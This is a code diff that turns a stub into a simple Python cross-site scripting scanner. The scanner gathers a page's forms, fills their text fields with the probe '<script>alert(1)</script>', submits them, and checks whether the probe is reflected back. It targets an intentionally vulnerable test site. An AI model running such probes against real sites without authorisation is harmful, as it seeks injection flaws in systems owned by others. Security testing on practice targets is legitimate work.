@@ -1,32 +1,68 @@
 from bs4 import BeautifulSoup as bs
-import mechanize
+from urllib.parse import urljoin
+import requests
 
-
-string_terminators = ["", "'" , ";", "';" , ]
+string_terminators = ["", "'", ";", "';", ]
 payloads = ['<script>alert(1)</script>']
 
 
 class xss_scanner:
 
-    def __init__(self, url, response):
+    def __init__(self, url):
         self.url = url
-        self.response = response
 
-    def update_response(self,new_response):
-        self.response = new_response
+    def forms(self):
+        content = bs(requests.get(self.url).content, "html.parser")
+        form_Content = content.find_all("form")
+        forms = []
+        for form in form_Content:
+            form_specs = {}
+            action = form.attrs.get("action").lower()
+            method = form.attrs.get("method", "get").lower()
+            inputs = []
+            for input_tag in form.find_all("input"):
+                input_type = input_tag.attrs.get("type", "text")
+                input_name = input_tag.attrs.get("name")
+                inputs.append({"type": input_type, "name": input_name})
 
-    def start_scan(self):
-        keys = {}
-        content = bs(self.response, "html.parser")
-        forms = content.find_all("form", method=True)
-        for form in forms:
-            inputs = form.find_all("input")
+            form_specs["action"] = action
+            form_specs["method"] = method
+            form_specs["inputs"] = inputs
+            forms.append(form_specs)
+        return forms
+
+    def submit(self, form_specs, payload):
+        data = {}
+        for form in form_specs:
+            target_url = urljoin(self.url, form["action"])
+            inputs = form["inputs"]
             for input in inputs:
-                print(input["name"])
+                if input["type"] == "text" or input["type"] == "search" or input["type"].lower() == "textarea":
+                    input["value"] = payload
+                    input_name = input["name"]
+                    input_value = input["value"]
+                if input_name and input_value:
+                    data[input_name] = input_value
 
+            if form["method"] == "post":
+                return requests.post(target_url, data=data)
+            else:
+                # GET request
+                return requests.get(target_url, params=data)
 
-
+    def main(self):
+        form_list = self.forms()
+        for P in payloads:
+            print(P)
+            response = self.submit(form_list, P)
+            if P in response.content.decode():
+                print(response.content.decode())
+                return True
+            else:
+                print("False")
+                return False
 
 
 if __name__ == '__main__':
-    print("This is code injection page")
+    scanner = xss_scanner(url="http://testphp.vulnweb.com/index.php")
+    scanner.main()
